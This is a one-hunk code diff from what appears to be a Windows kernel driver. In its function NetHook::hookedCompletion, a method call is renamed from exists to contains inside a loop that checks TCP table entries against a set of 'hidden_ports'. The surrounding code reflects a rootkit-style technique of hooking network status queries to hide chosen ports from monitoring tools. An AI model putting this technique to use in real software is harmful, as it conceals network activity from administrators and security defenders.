@@ -48,7 +48,7 @@ NTSTATUS NetHook::hookedCompletion(
 				for (i = 0; i < item_count; i++)
 				{
 
-					if (hidden_ports->exists(pTcpEntry[i].localEntry.Port))
+					if (hidden_ports->contains(pTcpEntry[i].localEntry.Port))
 					{
 
 						//NSI will map status array entry to tcp table array entry
